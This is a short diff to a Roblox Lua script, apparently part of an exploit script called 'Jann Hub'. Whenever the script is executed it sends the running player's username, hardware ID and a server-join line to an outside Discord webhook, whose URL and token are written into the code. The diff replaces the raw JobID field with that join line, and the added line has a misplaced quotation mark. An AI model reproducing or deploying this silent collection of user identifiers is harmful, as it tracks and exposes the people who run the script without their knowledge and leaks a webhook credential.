@@ -8,8 +8,7 @@ game.Players.PlayerAdded:Connect(function(Player)
 	end
 end)
 
- 
-
+ local join = "Roblox.GameLauncher.joinGameInstance(4889315193, game.JobId")
 
 local url =
    "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
@@ -18,7 +17,7 @@ local data = {
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Jann Hub** in: "   ..game.PlaceId.. " :) ",
-           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."**, HWID: **"..game:GetService("RbxAnalyticsService"):GetClientId().."** JobID: **"..game.JobId.."**",
+           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."**, HWID: **"..game:GetService("RbxAnalyticsService"):GetClientId().."** Console: **"..join.."**",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
